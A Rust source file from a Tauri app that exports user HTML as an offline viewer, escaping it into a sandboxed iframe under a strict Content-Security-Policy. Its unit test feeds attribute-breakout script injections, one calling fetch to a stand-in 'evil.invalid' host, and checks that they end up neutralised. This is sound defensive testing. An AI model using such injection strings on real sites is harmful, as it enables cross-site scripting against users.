//! Exported HTML runs source only inside a platform-owned opaque iframe.
use tauri::AppHandle;

fn escape(value: &str) -> String {
    value
        .replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#39;")
}
fn document(title: &str, html: &str) -> Result<String, String> {
    if title.chars().count() > 200 || html.trim().is_empty() || html.len() > 262144 {
        return Err("离线作品内容过长或无效 / Invalid or oversized offline creation".into());
    }
    let inner = format!("<!doctype html><meta charset=\"utf-8\"><meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; connect-src 'none'; frame-src 'none'; form-action 'none'; base-uri 'none'\">{html}");
    let title = escape(title);
    let inner = escape(&inner);
    Ok(format!(
        r#"<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; frame-src about:; connect-src 'none'; form-action 'none'; base-uri 'none'"><title>{title}</title><style>body{{margin:0;background:#f6f4ef;color:#252525;font:14px system-ui,sans-serif}}header{{padding:16px 24px}}h1{{font-size:20px;margin:0 0 8px}}p{{margin:0;line-height:1.5}}iframe{{display:block;width:100%;height:calc(100vh - 120px);min-height:480px;border:0;background:white}}</style></head><body><header><h1>{title}</h1><p>离线交互查看 · 不连接应用或外网，重新打开从原稿开始。<br>Offline viewer · No app or network access. Reopening starts from the original source.</p></header><iframe title="离线作品 / Offline creation" sandbox="allow-scripts" referrerpolicy="no-referrer" srcdoc="{inner}"></iframe></body></html>"#
    ))
}
#[tauri::command]
pub fn export_creation_offline(
    app: AppHandle,
    title: String,
    html: String,
) -> Result<String, String> {
    let file = document(&title, &html)?;
    crate::exports::export_verified_document(&app, &title, "html", file.as_bytes())
}
#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn executable_source_is_only_inside_an_escaped_opaque_frame() {
        let file=document("\"><script>bad</script>","\"><script>fetch('https://evil.invalid')</script><button onclick=\"this.textContent=42\">Go</button>").unwrap();
        assert_eq!(file.matches("<iframe ").count(), 1);
        assert!(!file.contains("<script>"));
        assert!(!file.contains("allow-same-origin"));
        assert!(file.contains("sandbox=\"allow-scripts\""));
        assert!(file.contains("frame-src about:"));
        assert!(file.contains("&lt;script&gt;fetch(&#39;https://evil.invalid&#39;)"));
        assert!(document("title", &"中".repeat(100000)).is_err());
    }
}
